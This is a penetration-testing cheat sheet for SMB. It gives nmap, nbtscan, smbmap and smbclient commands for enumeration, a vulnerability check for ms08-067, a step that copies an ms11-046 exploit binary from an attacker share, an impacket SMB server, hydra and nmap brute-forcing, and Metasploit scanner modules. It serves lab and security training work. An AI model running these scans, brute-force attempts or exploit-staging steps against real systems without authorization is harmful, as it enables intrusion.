## SMB - Cheatsheet

#### Discovery - Scanning for SMB Services
Find hosts

	nmap -v -p 139,445 <host/24>
	
ntbscan is used to query the NetBIOS name service for valid NetBIOS names
	
	sudo nbtscan -r <host/24>
	
Other useful Nmap commands

	nmap --script smb-enum-shares.nse -p445 <host>
	sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <host>
	nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <host>
	nmap -v -p 139,445 --script=smb* --script-args=unsafe=1 <host>
	
SMBMap

	smbmap -H [ip/hostname]
	smbmap --host-file <hosts.txt>
	smbmap --host-file SMB-HOSTS-WithOpenShares1.txt -d "domain.local" -u "username" -p "password"  

More SMBMap

	https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#smbmap
	
---

#### Accessing an SMB Share With Linux Machines
this will return a list of names of drives or printers that it can share with you. Unless the SMB server has no security configured, it will ask you for a password.

	smbclient -L <host>
	
Reach a directory that has been shared

	smbclient \\\\<host>\\<drive> <password>

---

#### Mount and Unmount

Create a directory to mount to 

	mkdir <directory>
	
Mount	

	sudo mount -t cifs //<ip>/<drive> ~/<directory>/ -o rw

The user option  ` -o user=Administrator `

	cd <directory> && ls
	
Unmount

	umount ~/<directory>
	
---

#### Accessing an SMB Share With Windows Machines

The first command will list all currently connected shares. The second will create a connection to the named shared at the given host (in our case, typically an IP address). The third command will close that connection.

	C:\>net use
	C:\>net use \\[host]\[share name]
	C:\>net use /d \\[host]\[share name]

Connect

	net use \\10.11.0.XXX\smb
	
Copy the file

	copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe

---

### Start SMB Share

- shareName can be anything
- sharePath path of the folder you want to share

`impacket-smbserver.py shareName sharePath`

---

### Brute Force

	nmap --script smb-brute -p 445 <IP>
	hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1

---
### Metasploit Modules

- Enumerate drives (authenticated and unauthenticated).

		use auxiliary/scanner/smb/smb_enumshares
		
- Enumerate users (authenticated and unauthenticated).

		use auxiliary/scanner/smb/smb_enumusers
	
- Brute-force using username and password lists.

		use auxiliary/scanner/smb/smb_login
		
- Find local users exist the system

		use auxiliary/scanner/smb/smb_lookupsid
		
- Find SMB version

		use auxiliary/scanner/smb/smb_version
		
---

### Guides

	https://www.nopsec.com/smbmap-wield-it-like-the-creator/
	
	https://book.hacktricks.xyz/pentesting/pentesting-smb

---

#### References
- Metasploit Modules https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/
- https://tldp.org/HOWTO/SMB-HOWTO-8.html
